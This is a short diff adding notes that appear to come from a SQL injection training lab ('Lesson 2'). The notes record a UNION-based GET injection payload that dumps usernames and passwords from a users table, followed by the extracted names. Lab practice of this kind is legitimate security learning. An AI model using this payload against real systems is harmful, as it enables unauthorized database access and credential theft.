@@ -1,0 +1,9 @@
+SURGICAL FLUSH FOR LESSON 2
+==============================
+VULN TYPE: UNION-Based
+METHOD: GET
+PAYLOAD: -1 UNION SELECT null,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),null-- -
+
+EXTRACTED DATA:
+Dumb
+Angelina
